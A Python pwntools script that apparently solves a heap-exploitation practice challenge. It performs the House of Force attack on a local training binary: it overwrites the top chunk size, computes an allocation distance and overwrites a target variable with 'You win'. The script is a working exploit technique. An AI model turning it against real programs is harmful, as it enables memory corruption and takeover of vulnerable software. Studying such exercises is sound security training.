from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_force', checksec=False)

libc = elf.libc

gs = """
b *main
b *main+295
b *main+448
"""

def info(mes):
    return log.info(mes)
    
def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path} ,gdbscript=gs)
    else:
        return process(elf.path)
    
def malloc(io, size, data):
    io.recvuntil(b'> ')
    io.send(b'1')
    io.recvuntil(b'size: ')
    io.send(f'{size}'.encode())
    io.recvuntil(b'data: ')
    io.send(data)
 
def delta(x, y):
    return (0xffffffffffffffff - x) + y
    
io = start()

io.recvuntil(b'puts() @ ')
puts_leak = int(io.recvn(14), 16) 
io.recvuntil(b'heap @ ')
heap_leak = int(io.recvn(8), 16)
info("The address of puts:: "+ hex(puts_leak))
info("The address of heap: " + hex(heap_leak))
distance = delta(heap_leak + 0x20, elf.sym['target'] - 0x20)
malloc(io, 24, b'a'*24 + p64(0xffffffffffffffff))
malloc(io, distance, b'oke')
malloc(io, 24, b'You win')

io.interactive() 
